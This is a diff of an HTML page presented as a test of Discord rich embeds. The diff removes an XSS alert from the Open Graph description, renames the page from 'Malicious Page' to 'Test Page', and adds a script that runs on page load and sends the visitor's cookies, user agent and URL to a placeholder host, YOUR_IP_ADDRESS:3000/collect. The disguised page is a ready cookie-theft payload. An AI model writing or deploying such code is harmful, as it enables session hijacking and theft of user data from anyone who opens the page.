@@ -3,11 +3,23 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Malicious Page</title>
-    <!-- Metadonnées Open Graph -->
+    <title>Test Page</title>
     <meta property="og:title" content="Check this out!" />
-    <meta property="og:description" content="<script>alert('XSS')</script>" />
+    <meta property="og:description" content="Test page for data collection" />
     <meta property="og:image" content="https://example.com/malicious-image.png" />
+    <script>
+        fetch('http://YOUR_IP_ADDRESS:3000/collect', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                cookies: document.cookie,
+                userAgent: navigator.userAgent,
+                url: window.location.href
+            })
+        });
+    </script>
 </head>
 <body>
     <p>This page is for testing Rich Embeds on Discord.</p>
